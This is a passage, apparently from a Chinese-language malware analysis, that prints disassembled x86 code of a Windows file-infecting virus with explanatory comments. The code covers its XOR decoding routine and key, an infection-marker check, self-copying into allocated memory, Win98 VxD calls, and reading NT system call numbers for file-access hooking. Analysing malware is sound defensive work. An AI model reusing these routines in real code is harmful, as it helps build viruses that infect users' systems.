
`movsb`

`mov     esi, ss:dword_36403C[ebp]`
`mov     edi, ss:dword_364040[ebp]`
`mov     ebx, ss:dword_364038[ebp]`

`loc_361124:` `pop     ebp`
`retn` `;病毒执行结束,返回原程序`

`sub_361126      proc near`
`rdtsc`
`retn`
`sub_361126      endp`
`db 0A9h` `;解码密钥`
`db  91h`

`DeCode          proc near`
`push    ebx`
`mov     ecx, 27B3h`
`mov     ebx, edx`
`loc_361133:` `xor     [eax], dl`
`sub     dl, bl`
`xchg    dl, dh`
`xchg    bl, bh`
`inc     eax`
`loop    loc_361133`
`pop     ebx`
`retn`
`DeCode          endp`

```
;--------------------------------------------------------------------------
```

经过上面一段解码以后,就可以看到比较完整的病毒代码了:

`loc_361140:` `call    loc_361151`
`db      'CloseHandle',0`
`loc_361151:` `push    ebx`
`call    esi` `;GetProcAddress`
`mov     ss:_CloseHandle[ebp], eax`
`call    loc_36116C`
`db      'CreateEventA',0`
`loc_36116C:` `push    ebx`
`call    esi` `;GetProcAddress`
`mov     ss:_CreateEventA[ebp], eax`
`call    loc_361187`
`db      'GetLastError',0`
`loc_361187:` `push    ebx`
`call    esi` `;GetProcAddress`
`mov     ss:_GetLastError[ebp], eax`
`call    CreateEvent_Vx_4` `;创建 Event`
`test    eax, eax`
`jz      loc_3610F9`
`push    eax`
`call    ss:_GetLastError[ebp]`
`test    eax, eax` `;如果 Event 已经存在,说明系统已经感染`
`jnz     loc_36152D` `;跳到返回原程序的地方`
`cmp     ss:byte_361538[ebp], 1`
`jnz     short loc_3611C9`
`push    ss:dword_364038[ebp]`
`dec     ss:byte_361538[ebp]`
`pop     ss:dword_361590[ebp]`
`jmp     short loc_3611D0`
`loc_3611C9:` `and     ss:dword_361590[ebp], 0`
`loc_3611D0:` `and     ss:dword_361580[ebp], 0`
`and     ss:dword_361584[ebp], 0`
`and     ss:dword_361588[ebp], 0`
`push    edi`
`mov     byte ptr [ebp+3612DDh], 1`
`mov     ss:_GetProcAddress[ebp], esi`
`lea     esi, s->Lstrlen[ebp]`
`xor     ecx, ecx`
`lea     edi, _lstrlen[ebp]`
`mov     cl, 20h`
`call    ImportApi` `;初始化 kernel32 api`
`pop     edi`
`call    ss:_GetVersion[ebp]` `;获取系统版本`
`shr     eax, 1Fh`
`jz      loc_3612EC`
`mov     eax, [edi+14h]` `;WIN98`
`push    40h ; '@'`
`add     eax, ebx`
`push    8001000h`
`mov     ss:dword_363BA6[ebp], eax`
`push    7058h`
`push    0`
`call    ss:_VirtualAlloc[ebp]`
`test    eax, eax`
`jz      loc_36152D`
`xchg    eax, edi`
`lea     esi, loc_361000[ebp]`
`mov     ebp, edi`
`mov     ecx, 0C16h`
`sub     ebp, offset loc_361000`
`lea     edx, loc_36125D[ebp]`
`rep movsd`
`jmp     edx`
`loc_36125D:` `sub     esp, 20h`
`mov     edi, esp`
`push    8`
`xor     eax, eax`
`pop     ecx`
`lea     edx, loc_361B45[ebp]`
`rep stosd`
`mov     edi, esp`
`mov     [edi+10h], edx`
`inc     byte ptr [edi+1Ch]`
`push    edi`
`push    10003h`
`call    ss:dword_363BA6[ebp]`
`add     esp, 20h`
`test    eax, eax`
`jz      loc_36152D`
`xchg    eax, edi`
`push    0`
`push    1`
`push    80000400h`
`push    10000h`
`call    ss:dword_363BA6[ebp]`
`test    eax, eax`
`jz      loc_36152D`
`push    0`
`push    eax`
`push    40000h`
`push    0`
`shr     eax, 0Ch`
`push    edi`
`push    1`
`push    eax`
`push    10001h`
`call    ss:dword_363BA6[ebp]`
`push    1000Ah`
`call    ss:dword_363BA6[ebp]`
`call    sub_Sleep_0A`
`jmp     loc_36152D`
`loc_3612EC:` `cmp     ss:_CreateToolhelp32Snapshot[ebp],0` `;WINNT`
`jz      loc_36152D`
`call    loc_361304`
`db      'NTDLL',0`
`loc_361304:` `call    ss:_GetModuleHandleA[ebp]`
`lea     esi, s->Ntadjustprivilegestoken[ebp]`
`xor     ecx, ecx`
`lea     edi, _NtAdjustPrivilegesToken[ebp]`
`mov     cl, 0Eh`
`xchg    eax, ebx`
`call    ImportApi` `;初始化 ntdll api`
`cmp     ss:_RtlUnicodeStringToAnsiString[ebp], 0`
`jz      loc_36152D`
`mov     eax, ss:_NtCreateFile[ebp]`
`push    dword ptr [eax+1]` `;取 NtCreateFile 系统调用编号`
`pop     dword ptr ss:(New_NtCreateFile+1)[ebp]`
`mov     eax, ss:_NtOpenFile[ebp]`
`push    dword ptr [eax+1]` `;取 NtOpenFile 系统调用编号`
